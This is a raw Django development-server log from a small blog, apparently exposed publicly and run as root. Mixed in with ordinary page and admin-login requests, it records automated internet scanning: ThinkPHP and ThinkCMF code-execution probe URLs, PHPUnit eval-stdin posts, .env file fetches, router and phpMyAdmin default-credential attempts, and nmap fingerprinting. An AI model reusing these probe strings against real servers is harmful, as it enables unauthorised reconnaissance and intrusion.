Watching for file changes with StatReloader
[09/Jan/2021 08:56:32] "GET / HTTP/1.1" 200 16351
[09/Jan/2021 08:56:32] "GET /static/admin/css/fonts.css HTTP/1.1" 200 423
[09/Jan/2021 08:56:32] "GET /static/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.1" 200 85876
Not Found: /favicon.ico
[09/Jan/2021 08:56:32] "GET /favicon.ico HTTP/1.1" 404 1969
[09/Jan/2021 08:56:32] "GET /static/admin/fonts/Roboto-Bold-webfont.woff HTTP/1.1" 200 86184
[09/Jan/2021 08:56:32] "GET /static/admin/fonts/Roboto-Light-webfont.woff HTTP/1.1" 200 85692
Not Found: /TP/public/index.php
[09/Jan/2021 09:11:45] "GET /TP/public/index.php HTTP/1.1" 404 1996
Not Found: /TP/index.php
[09/Jan/2021 09:11:46] "GET /TP/index.php HTTP/1.1" 404 1975
Not Found: /thinkphp/html/public/index.php
[09/Jan/2021 09:11:48] "GET /thinkphp/html/public/index.php HTTP/1.1" 404 2029
Not Found: /html/public/index.php
[09/Jan/2021 09:11:48] "GET /html/public/index.php HTTP/1.1" 404 2002
[09/Jan/2021 09:11:55] "GET / HTTP/1.1" 200 16351
Not Found: /login
[09/Jan/2021 09:32:48] "GET /login HTTP/1.0" 404 1953
Not Found: /manager/html
[09/Jan/2021 09:32:48] "GET /manager/html HTTP/1.0" 404 1974
Not Found: /.env
[09/Jan/2021 09:43:27] "GET /.env HTTP/1.1" 404 1951
Not Found: /.env
[09/Jan/2021 09:43:28] "POST /.env HTTP/1.1" 404 1952
/root/myblog/settings.py changed, reloading.
Performing system checks...

System check identified no issues (0 silenced).
January 09, 2021 - 08:56:14
Django version 3.1, using settings 'myblog.settings'
Starting development server at http://0:80/
Quit the server with CONTROL-C.
Watching for file changes with StatReloader
[09/Jan/2021 09:56:44] "GET /admin HTTP/1.1" 301 0
[09/Jan/2021 09:56:44] "GET /admin/ HTTP/1.1" 302 0
[09/Jan/2021 09:56:44] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 2194
[09/Jan/2021 09:56:44] "GET /static/admin/css/base.css HTTP/1.1" 200 16307
[09/Jan/2021 09:56:44] "GET /static/admin/css/nav_sidebar.css HTTP/1.1" 200 1789
[09/Jan/2021 09:56:44] "GET /static/admin/js/nav_sidebar.js HTTP/1.1" 200 1360
[09/Jan/2021 09:56:44] "GET /static/admin/css/login.css HTTP/1.1" 200 1185
[09/Jan/2021 09:56:44] "GET /static/admin/css/responsive.css HTTP/1.1" 200 18617
[09/Jan/2021 09:56:45] "GET /admin/ HTTP/1.1" 302 0
[09/Jan/2021 09:56:46] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 2194
[09/Jan/2021 09:56:49] "POST /admin/login/?next=/admin/ HTTP/1.1" 302 0
[09/Jan/2021 09:56:49] "GET /admin/ HTTP/1.1" 200 3307
[09/Jan/2021 09:56:49] "GET /static/admin/css/dashboard.css HTTP/1.1" 200 380
[09/Jan/2021 09:56:49] "GET /static/admin/img/icon-addlink.svg HTTP/1.1" 200 331
[09/Jan/2021 09:56:49] "GET /static/admin/img/icon-changelink.svg HTTP/1.1" 200 380
[09/Jan/2021 10:42:26] "GET / HTTP/1.1" 200 16351
[09/Jan/2021 11:45:42] "GET / HTTP/1.1" 200 16351
[09/Jan/2021 11:59:39] "GET / HTTP/1.1" 200 16351
[09/Jan/2021 12:24:18] "HEAD / HTTP/1.0" 200 16351
[09/Jan/2021 12:59:33] "GET / HTTP/1.1" 200 16351
[09/Jan/2021 13:19:18] "GET / HTTP/1.1" 200 16351
[09/Jan/2021 13:19:18] "GET /static/admin/css/fonts.css HTTP/1.1" 304 0
[09/Jan/2021 13:19:18] "GET /static/admin/fonts/Roboto-Bold-webfont.woff HTTP/1.1" 304 0
[09/Jan/2021 13:19:18] "GET /static/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.1" 304 0
[09/Jan/2021 13:19:18] "GET /static/admin/fonts/Roboto-Light-webfont.woff HTTP/1.1" 304 0
Not Found: /favicon.ico
[09/Jan/2021 13:19:18] "GET /favicon.ico HTTP/1.1" 404 1969
[09/Jan/2021 13:31:54] "GET / HTTP/1.1" 200 16351
[09/Jan/2021 13:35:43] "GET / HTTP/1.1" 200 16351
[09/Jan/2021 13:41:25] "GET / HTTP/1.0" 200 16351
Not Found: /boaform/admin/formLogin
[09/Jan/2021 13:51:43] "GET /boaform/admin/formLogin?username=ec8&psd=ec8 HTTP/1.0" 404 2032
Not Found: /api/jsonws/invoke
[09/Jan/2021 13:52:54] "POST /api/jsonws/invoke HTTP/1.1" 404 1994
Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
[09/Jan/2021 13:52:54] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2093
Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
[09/Jan/2021 13:52:55] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2092
Not Found: /solr/admin/info/system
[09/Jan/2021 13:52:55] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 2016
[09/Jan/2021 13:52:56] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 16351
Not Found: /wp-content/plugins/wp-file-manager/readme.txt
[09/Jan/2021 13:52:56] "GET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1" 404 2077
Not Found: /console/
[09/Jan/2021 13:52:56] "GET /console/ HTTP/1.1" 404 1966
Not Found: /Autodiscover/Autodiscover.xml
[09/Jan/2021 13:52:56] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 404 2030
Not Found: /index.php
[09/Jan/2021 13:52:57] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 404 2088
[09/Jan/2021 13:52:57] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 16351
[09/Jan/2021 14:22:13] "HEAD / HTTP/1.0" 200 16351
Not Found: /manager/html/
[09/Jan/2021 14:48:55] "GET /manager/html/ HTTP/1.0" 404 1977
[09/Jan/2021 14:52:16] "GET / HTTP/1.1" 200 16351
Not Found: /http:/www.baidu.com/cache/global/img/gs.gif
[09/Jan/2021 14:58:28] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 1742
----------------------------------------
Exception happened during processing of request from ('80.82.70.187', 56535)
Traceback (most recent call last):
  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[09/Jan/2021 15:47:36] "GET / HTTP/1.1" 200 16351
----------------------------------------
Exception happened during processing of request from ('167.248.133.37', 53290)
Traceback (most recent call last):
  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 172, in handle
    self.handle_one_request()
  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[09/Jan/2021 15:53:07] "GET / HTTP/1.1" 200 16351
----------------------------------------
Exception happened during processing of request from ('167.248.133.37', 54330)
Traceback (most recent call last):
  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[09/Jan/2021 15:53:07] "GET / HTTP/1.1" 200 16351
[09/Jan/2021 15:53:25] "GET / HTTP/1.1" 200 16351
[09/Jan/2021 15:53:51] "GET / HTTP/1.1" 200 16351
[09/Jan/2021 16:36:15] "GET / HTTP/1.1" 200 16351
Not Found: /login
[09/Jan/2021 17:18:06] "GET /login HTTP/1.0" 404 1953
Not Found: /manager/html
[09/Jan/2021 17:18:06] "GET /manager/html HTTP/1.0" 404 1974
[09/Jan/2021 17:20:52] "GET / HTTP/1.1" 200 16351
[09/Jan/2021 17:26:47] "GET / HTTP/1.1" 200 16351
----------------------------------------
Exception happened during processing of request from ('74.120.14.39', 42164)
Traceback (most recent call last):
  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 172, in handle
    self.handle_one_request()
  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[09/Jan/2021 17:32:05] "GET / HTTP/1.1" 200 16351
----------------------------------------
Exception happened during processing of request from ('74.120.14.39', 41442)
Traceback (most recent call last):
  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[09/Jan/2021 17:32:05] "GET / HTTP/1.1" 200 16351
[09/Jan/2021 19:11:18] "GET / HTTP/1.1" 200 16351
[09/Jan/2021 19:19:36] "GET / HTTP/1.1" 200 16351
[09/Jan/2021 19:59:48] "GET / HTTP/1.1" 200 16351
----------------------------------------
Exception happened during processing of request from ('84.25.216.235', 54990)
Traceback (most recent call last):
  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[09/Jan/2021 20:32:18] "GET / HTTP/1.0" 200 16351
Not Found: /config/getuser
[09/Jan/2021 21:00:06] "GET /config/getuser?index=0 HTTP/1.1" 404 1992
Not Found: /boaform/admin/formLogin
[09/Jan/2021 21:28:59] "POST /boaform/admin/formLogin HTTP/1.1" 404 2012
[09/Jan/2021 22:00:05] "GET / HTTP/1.1" 200 16351
[09/Jan/2021 23:12:14] "GET / HTTP/1.1" 200 16351
Not Found: /http:/www.baidu.com/cache/global/img/gs.gif
[10/Jan/2021 00:35:05] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 1742
----------------------------------------
Exception happened during processing of request from ('80.82.70.187', 41023)
Traceback (most recent call last):
  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
Not Found: /login
[10/Jan/2021 00:48:18] "GET /login HTTP/1.0" 404 1953
Not Found: /manager/html
[10/Jan/2021 00:48:19] "GET /manager/html HTTP/1.0" 404 1974
[10/Jan/2021 01:07:30] "GET / HTTP/1.1" 200 16351
----------------------------------------
Exception happened during processing of request from ('42.127.101.41', 46957)
Traceback (most recent call last):
  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
Not Found: /robots.txt
[10/Jan/2021 01:20:26] "GET /robots.txt HTTP/1.1" 404 1966
[10/Jan/2021 01:20:38] "GET / HTTP/1.1" 200 16351
[10/Jan/2021 02:06:34] "GET / HTTP/1.1" 200 16351
[10/Jan/2021 03:28:56] "GET / HTTP/1.1" 200 16351
[10/Jan/2021 03:35:32] "GET / HTTP/1.0" 200 16351
Not Found: /.env
[10/Jan/2021 03:49:28] "GET /.env HTTP/1.1" 404 1951
[10/Jan/2021 03:49:28] "POST / HTTP/1.1" 200 16351
[10/Jan/2021 04:29:21] "GET / HTTP/1.1" 200 16351
[10/Jan/2021 04:50:19] code 400, message Bad request version ('À\x14À')
[10/Jan/2021 04:50:19] You're accessing the development server over HTTPS, but it only supports HTTP.

----------------------------------------
Exception happened during processing of request from ('162.142.125.54', 39352)
Traceback (most recent call last):
  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 172, in handle
    self.handle_one_request()
  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[10/Jan/2021 05:27:59] "GET / HTTP/1.1" 200 16351
----------------------------------------
Exception happened during processing of request from ('162.142.125.54', 40444)
Traceback (most recent call last):
  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[10/Jan/2021 05:27:59] "GET / HTTP/1.1" 200 16351
Not Found: /config/getuser
[10/Jan/2021 06:27:25] "GET /config/getuser?index=0 HTTP/1.1" 404 1992
Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
[10/Jan/2021 06:50:07] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2093
Not Found: /api/jsonws/invoke
[10/Jan/2021 06:50:07] "POST /api/jsonws/invoke HTTP/1.1" 404 1994
Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
[10/Jan/2021 06:50:08] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2092
Not Found: /index.php
[10/Jan/2021 06:50:08] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 404 2088
[10/Jan/2021 06:50:09] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 16351
Not Found: /solr/admin/info/system
[10/Jan/2021 06:50:09] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 2016
[10/Jan/2021 06:50:09] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 16351
Not Found: /wp-content/plugins/wp-file-manager/readme.txt
[10/Jan/2021 06:50:10] "GET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1" 404 2077
Not Found: /console/
[10/Jan/2021 06:50:10] "GET /console/ HTTP/1.1" 404 1966
Not Found: /Autodiscover/Autodiscover.xml
[10/Jan/2021 06:50:10] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 404 2030
Not Found: /wp-login.php
[10/Jan/2021 06:51:11] "GET /wp-login.php HTTP/1.1" 404 1972
[10/Jan/2021 06:52:28] "GET / HTTP/1.1" 200 16351
[10/Jan/2021 08:30:36] "GET / HTTP/1.1" 200 16351
[10/Jan/2021 08:30:36] "GET /static/admin/css/fonts.css HTTP/1.1" 304 0
[10/Jan/2021 08:30:37] "GET /static/admin/fonts/Roboto-Bold-webfont.woff HTTP/1.1" 304 0
[10/Jan/2021 08:30:37] "GET /static/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.1" 304 0
[10/Jan/2021 08:30:37] "GET /static/admin/fonts/Roboto-Light-webfont.woff HTTP/1.1" 304 0
Not Found: /favicon.ico
[10/Jan/2021 08:30:37] "GET /favicon.ico HTTP/1.1" 404 1969
[10/Jan/2021 08:37:02] "GET / HTTP/1.0" 200 16351
[10/Jan/2021 08:37:03] "OPTIONS / HTTP/1.0" 200 16351
[10/Jan/2021 08:37:03] code 400, message Bad request version ('RTSP/1.0')
[10/Jan/2021 08:37:03] "OPTIONS / RTSP/1.0" 400 -
[10/Jan/2021 08:37:09] code 400, message Bad HTTP/0.9 request type ('l\x00')
[10/Jan/2021 08:37:09] "l          " 400 -
Not Found: /nice ports,/Trinity.txt.bak
[10/Jan/2021 08:37:09] "GET /nice%20ports%2C/Tri%6Eity.txt%2ebak HTTP/1.0" 404 2021
[10/Jan/2021 08:37:16] code 400, message Bad request version ('\x00\x01\x97|\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
[10/Jan/2021 08:37:16] "  (rþ          |                    " 400 -
[10/Jan/2021 08:37:21] code 400, message Bad HTTP/0.9 request type ('\x00')
[10/Jan/2021 08:37:21] "          versionbind   " 400 -
[10/Jan/2021 08:37:26] code 400, message Bad HTTP/0.9 request type ('\x00')
[10/Jan/2021 08:37:26] "            " 400 -
[10/Jan/2021 08:37:27] code 400, message Bad request syntax ('HELP')
[10/Jan/2021 08:37:27] "HELP" 400 -
[10/Jan/2021 08:37:27] code 400, message Bad request syntax ('\x16\x03\x00\x00S\x01\x00\x00O\x03\x00?G×÷º,îê²`~ó\x00ý\x82{¹Õ\x96Èw\x9bæÄÛ<=Ûoï\x10n\x00\x00(\x00\x16\x00\x13\x00')
[10/Jan/2021 08:37:27] You're accessing the development server over HTTPS, but it only supports HTTP.

[10/Jan/2021 08:37:28] code 400, message Bad request version ('\x00/\x00')
[10/Jan/2021 08:37:28] You're accessing the development server over HTTPS, but it only supports HTTP.

[10/Jan/2021 08:37:29] code 400, message Bad request syntax ('\x00\x00\x00qj\x81n0\x81k¡\x03\x02\x01\x05¢\x03\x02\x01')
[10/Jan/2021 08:37:29] "   qjn0k¡¢" 400 -
[10/Jan/2021 08:37:34] code 400, message Bad request syntax ('\x00\x00\x00¤ÿSMBr\x00\x00\x00\x00\x08\x01@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x06\x00\x00\x01\x00\x00\x81\x00\x02PC NETWORK PROGRAM 1.0\x00\x02MICROSOFT NETWORKS 1.03\x00\x02MICROSOFT NETWORKS 3.0\x00\x02LANMAN1.0\x00\x02LM1.2X002\x00\x02Samba\x00\x02NT LANMAN 1.0\x00\x02NT LM 0.12\x00')
[10/Jan/2021 08:37:34] "   ¤ÿSMBr    @              @     PC NETWORK PROGRAM 1.0 MICROSOFT NETWORKS 1.03 MICROSOFT NETWORKS 3.0 LANMAN1.0 LM1.2X002 Samba NT LANMAN 1.0 NT LM 0.12 " 400 -
[10/Jan/2021 08:37:34] code 400, message Bad request syntax ('\x01default')
[10/Jan/2021 08:37:34] "default" 400 -
[10/Jan/2021 08:37:35] code 400, message Bad request syntax ('0\x84\x00\x00\x00-\x02\x01\x07c\x84\x00\x00\x00$\x04\x00')
[10/Jan/2021 08:37:35] "0   -c   $ " 400 -
[10/Jan/2021 08:37:41] code 400, message Bad HTTP/0.9 request type ('0')
[10/Jan/2021 08:37:41] "0`  " 400 -
[10/Jan/2021 08:37:41] code 400, message Bad request version ('SIP/2.0')
[10/Jan/2021 08:37:41] "OPTIONS sip:nm SIP/2.0" 400 -
[10/Jan/2021 08:37:47] code 400, message Bad request syntax ('TNMP\x04\x00\x00\x00TNME\x00\x00\x04\x00')
[10/Jan/2021 08:37:47] "TNMP   TNME   " 400 -
[10/Jan/2021 08:37:52] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00')
[10/Jan/2021 08:37:52] "  à     " 400 -
[10/Jan/2021 08:37:58] code 400, message Bad request syntax ('DmdT\x00\x00\x00\x17\x00\x00\x00\x01\x00\x00\x00\x00\x11\x11\x00ÿ\x01ÿ\x13')
[10/Jan/2021 08:37:58] "DmdT           ÿÿ" 400 -
[10/Jan/2021 08:38:03] code 400, message Bad HTTP/0.9 request type (':\x00\x00\x00/\x00\x00\x00\x02\x00\x00@\x02\x0f\x00\x01\x00=\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00/\x00\x00\x00\x00\x00\x00\x00\x00\x00@')
[10/Jan/2021 08:38:03] ":   /     @  =            /         @                 " 400 -
[10/Jan/2021 08:38:08] code 400, message Bad request syntax ('JRMI\x00\x02K')
[10/Jan/2021 08:38:08] "JRMI K" 400 -
[10/Jan/2021 08:38:14] code 400, message Bad request syntax ('\x01\x00\x00ýÎú\x0b°\xa0\x00\x00\x00MMS\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x12\x00\x00\x00\x01\x00\x03\x00ðððð\x0b\x00\x04\x00\x1c\x00\x03\x00N\x00S\x00P\x00l\x00a\x00y\x00e\x00r\x00/\x009\x00.\x000\x00.\x000\x00.\x002\x009\x008\x000\x00;\x00 \x00{\x000\x000\x000\x000\x00A\x00A\x000\x000\x00-\x000\x00A\x000\x000\x00-\x000\x000\x00a\x000\x00-\x00A\x00A\x000\x00A\x00-\x000\x000\x000\x000\x00A\x000\x00A\x00A\x000\x00A\x00A\x000\x00}\x00\x00\x00àmß_')
[10/Jan/2021 08:38:14] "  ýÎú°    MMS                    ðððð    N S P l a y e r / 9 . 0 . 0 . 2 9 8 0 ;   { 0 0 0 0 A A 0 0 - 0 A 0 0 - 0 0 a 0 - A A 0 A - 0 0 0 0 A 0 A A 0 A A 0 }   àmß_" 400 -
[10/Jan/2021 08:38:19] code 400, message Bad HTTP/0.9 request type ('\x00Z\x00\x00\x01\x00\x00\x00\x016\x01,\x00\x00\x08\x00\x7fÿ\x7f\x08\x00\x00\x00\x01\x00')
[10/Jan/2021 08:38:19] " Z     6,   ÿ      :                4æ           (CONNECT_DATA=(COMMAND=version))" 400 -
[10/Jan/2021 08:38:24] code 400, message Bad request version ('\x03\x00(\x00\x04ÿ\x08\x00\x01U\x00\x00\x00MSSQLServer\x00H\x0f\x00\x00')
[10/Jan/2021 08:38:24] " 4            ( ÿ U   MSSQLServer H  " 400 -
[10/Jan/2021 08:38:30] code 400, message Bad request syntax ('\x00\x03\x00\x01\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x0f\x00')
[10/Jan/2021 08:38:30] "              " 400 -
[10/Jan/2021 08:38:35] code 400, message Bad request syntax ('GIOP\x01\x00\x01\x00$\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x06\x00\x00\x00abcdef\x00\x00\x04\x00\x00\x00get\x00\x00\x00\x00\x00')
[10/Jan/2021 08:38:35] "GIOP  $                abcdef     get     " 400 -
Not Found: /sdk
[10/Jan/2021 08:38:36] "POST /sdk HTTP/1.1" 404 1949
[10/Jan/2021 08:38:36] code 400, message Bad HTTP/0.9 request type ('t3')
[10/Jan/2021 08:38:36] "t3 12.1.2" 400 -
Not Found: /nmaplowercheck1610267915
[10/Jan/2021 08:38:36] "GET /nmaplowercheck1610267915 HTTP/1.1" 404 2011
Not Found: /evox/about
[10/Jan/2021 08:38:37] "GET /evox/about HTTP/1.1" 404 1969
Not Found: /HNAP1
[10/Jan/2021 08:38:37] "GET /HNAP1 HTTP/1.1" 404 1954
[10/Jan/2021 08:38:37] "HEAD / HTTP/1.1" 200 16351
[10/Jan/2021 08:38:38] "GET / HTTP/1.1" 200 16351
[10/Jan/2021 08:42:30] "HEAD / HTTP/1.0" 200 16351
[10/Jan/2021 09:35:37] "GET / HTTP/1.1" 200 16351
Not Found: /http:/www.baidu.com/cache/global/img/gs.gif
[10/Jan/2021 10:09:40] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 1742
----------------------------------------
Exception happened during processing of request from ('80.82.70.187', 47798)
Traceback (most recent call last):
  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[10/Jan/2021 10:33:10] "GET / HTTP/1.1" 200 16351
[10/Jan/2021 10:50:45] "HEAD / HTTP/1.0" 200 16351
Not Found: /phpmyadmin/index.php
[10/Jan/2021 10:55:11] "GET /phpmyadmin/index.php?lang=en HTTP/1.1" 404 2007
Not Found: /phpMyadmin/index.php
[10/Jan/2021 10:55:11] "GET /phpMyadmin/index.php?lang=en HTTP/1.1" 404 2007
Not Found: /phpMyAdmin/index.php
[10/Jan/2021 10:55:12] "GET /phpMyAdmin/index.php?lang=en HTTP/1.1" 404 2007
Not Found: /phpMyAdmin/index.php
[10/Jan/2021 10:55:12] "GET /phpMyAdmin/index.php?lang=en&pma_username=popa3d&pma_password=popa3d HTTP/1.1" 404 2055
[10/Jan/2021 11:04:38] "GET / HTTP/1.1" 200 16351
[10/Jan/2021 11:31:26] "GET / HTTP/1.1" 200 16351
Not Found: /ip.ws.126.net:443
[10/Jan/2021 12:12:46] "CONNECT ip.ws.126.net:443 HTTP/1.1" 404 1670
Not Found: /boaform/admin/formLogin
[10/Jan/2021 12:16:53] "POST /boaform/admin/formLogin HTTP/1.1" 404 2012
[10/Jan/2021 12:23:29] "GET / HTTP/1.1" 200 16351
/root/myblog/urls.py changed, reloading.
Performing system checks...

System check identified no issues (0 silenced).
January 09, 2021 - 09:55:25
Django version 3.1, using settings 'myblog.settings'
Starting development server at http://0:80/
Quit the server with CONTROL-C.
Watching for file changes with StatReloader
/root/myblog/urls.py changed, reloading.
Performing system checks...

System check identified no issues (0 silenced).
January 10, 2021 - 12:27:42
Django version 3.1, using settings 'myblog.settings'
Starting development server at http://0:80/
Quit the server with CONTROL-C.
Watching for file changes with StatReloader
